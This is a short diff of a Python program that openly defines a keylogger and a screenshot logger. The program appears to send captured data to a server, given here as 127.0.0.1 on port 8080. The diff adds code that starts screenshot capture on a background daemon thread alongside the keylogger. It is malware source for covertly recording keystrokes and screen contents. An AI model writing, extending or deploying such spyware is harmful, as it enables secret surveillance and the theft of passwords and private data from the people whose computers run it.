@@ -1,16 +1,12 @@
 from pynput import keyboard
-
 import requests
-
 import json
-
 import threading
-
 import pyautogui
 import string
 import random
 from datetime import datetime
-
+import os
 
 class KeyLogger:
 
@@ -117,7 +113,13 @@ class ScreenshotLogger:
 
         loop()
 
+screenshot_logger = ScreenshotLogger(interval= 10)
+screenshot_thread = threading.Thread(target = screenshot_logger.start)
+screenshot_thread.daemon = True
+screenshot_thread.start()
 
 keylogger = KeyLogger(interval=10, port="8080", server_ip="127.0.0.1")
 keylogger.start()
+
+
 
